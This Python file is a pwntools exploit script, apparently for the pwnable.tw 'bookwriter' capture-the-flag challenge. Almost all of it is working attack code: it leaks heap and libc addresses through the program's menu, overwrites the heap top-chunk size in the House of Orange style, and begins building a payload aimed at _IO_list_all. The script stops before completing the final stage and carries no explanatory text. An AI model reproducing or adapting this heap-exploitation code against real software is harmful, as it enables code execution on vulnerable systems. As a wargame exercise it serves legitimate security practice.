from pwn import *

io = process('./bookwriter')#, env={"LD_PRELOAD":"libc_64.so.6"})
#io = remote('chall.pwnable.tw', 10304)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size, content):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil(b'Size of page :'))
    io.sendline(str(size))
    print(io.recvuntil(b'Content :'))
    io.send(content)

def view(index):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'2')
    print(io.recvuntil(b'Index of page :'))
    io.sendline(str(index))

def edit(index, content):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'3')
    print(io.recvuntil(b'Index of page :'))
    io.sendline(str(index))
    print(io.recvuntil(b'Content:'))
    io.send(content)

def change_author(new_name):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')
    #print(io.recvuntil(b'Do you want to change the author ? (yes:1 / no:0) '))
    #io.sendline(b'1')
    #print(io.recvuntil(b'Author :'))
    #io.send(new_name)


def leak():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')
    print(io.recvuntil(b'Author : '))
    print(io.recv(0x40))
    leak = u64(io.recv(4)+b'\0\0\0\0')
    print(io.recvuntil(b'Do you want to change the author ? (yes:1 / no:0) '))
    io.sendline(b'0')
    return leak


print(io.recvuntil(b'Author :'))
author = b'A'*0x40
io.send(author)
add(20, b'A') #1
heapleak = leak()
print(hex(heapleak))
add(24, b'A') #2
edit(1, b'A'*24)
edit(1, b'A'*24+b'\xb1\x1f\0')
add(0x2000, b'CUM') #3
add(20, 'A') #4
view(3)
print(io.recvuntil('Content :\n'))
libc.address = u64(io.recv(6)+b'\0\0') - 0x3c5241
print('LIBC: '+hex(libc.address))
add(20, 'A') #5
add(20, 'A') #6
add(20, 'A') #7
add(20, 'A') #8
edit(0, '\n')
add(20, 'A')
pause()
padding = b'A'*24+p64(0x1011)+b'A'*0x1008+(p64(0x21)+b'A'*24)*7
payload = padding + p64(0x1ed1) + p64(libc.sym['_IO_list_all'])
edit(0, b'A'*10)
#edit()
